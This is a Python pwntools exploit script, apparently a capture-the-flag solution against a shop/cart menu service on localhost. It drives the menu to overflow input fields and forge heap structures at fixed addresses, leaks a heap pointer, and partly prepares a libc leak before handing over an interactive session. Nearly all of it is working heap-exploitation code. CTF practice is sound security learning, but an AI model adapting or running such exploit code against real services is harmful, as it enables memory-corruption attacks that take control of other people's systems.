from pwn import *
import time
context.log_level = 'debug'

def m():
    r.recvuntil(": ")

def cr_pr(name, pr, stock=None):
    m()
    r.send("1\n")
    if stock == None:
        r.send("%s\n%d\n" % (name, pr))
    else:
        r.send("%s\n%d\n%d\n" % (name, pr, stock))

def l_pr():
    m()
    r.send("2\n")
    return r.recvuntil("####")

def cr_crt(name, num):
    m()
    r.send("1\n%s\n%d\n" % (name, num))

def buy():
    m()
    r.send("3\n")

def switch():
    m()
    global mode
    if mode == "1":
        mode = "2"
    else:
        mode = "1"
    r.send("0\n") # out mode
    m()
    r.send("%s\n" % mode)

def br(name, when):
    r.send("y\n")
    r.send(name + "\n")
    r.send(when + "\n")

def hidden(name=None, reason=None):
    m()
    r.send("-1\n")
    if name is not None:
        r.send("y\n")
        r.send(name + "\n")
    else:
        r.send("n\n")

    if reason is not None:
        r.send("y\n")
        r.send(reason + "\n")
    else:
        r.send("n\n")

def reset_crt():
    m()
    r.send("4\n")

r = remote('localhost', 4444)
mode = "1"

m()
r.send("1\n") # shop mode

cr_pr("a", 65536, 65536)
v = float(l_pr().split("x")[1].split(")")[0])
print("VAR: %f" % v)

switch()
cr_crt("a", (int)(65536  / 2 / v))
buy()

switch()
br("C" * 0x3e, "F"*0x22 + "C"*8 + "B"*2 + "Q"*8 + "B" * 10) # good


cr_pr("a", 1, 4)
switch()

cr_crt("a", 1)
switch() # make heap same

cr_pr("b", 1, 4) # target

fake_prod = p64(0x603118) + "\x00"*8 + "\x00" * 8 + "\x00" * 8
fake_crt = "\x00" * 8 * 3

m()
r.send("0\n")
hidden("A" * 0xf0 + fake_crt + "\x00" * 8 + fake_prod, "F" * 0x2E + p64(0x20) )

r.send("1\n") # shop mode
l = l_pr()
r.recvuntil("001 : ")
heap = u32(r.readline().split("(")[0].ljust(4, "\x00"))
print("HEAP: %16X" % heap)

m()
r.send("0\n")
fake_prod = p64(0x603118) + "\x00"*8 + p64(0x20) * 2
fake_crt = "\x00" * 8 * 2 + p64(heap)
print(len(fake_crt + "\x00" * 8 + fake_prod))

raw_input("reset\n")
hidden("A" * 0xe8 + p64(0x40) + fake_crt + "\x00" * 8 + fake_prod,
"F" * 0x30 + p64(0x20))

r.send("2\n") # cart mode
raw_input("reset\n")
reset_crt()


#libc_base = u64(r.readline()[:6]+"\x00"*2) - 0x0000000000021e50
#print("LIBC_START_MAIN: %16X" % libc_base)

#fwrite = p64(libc_base + 0x000000000006ecb0)
#raw_input("gogo\n")
r.interactive()
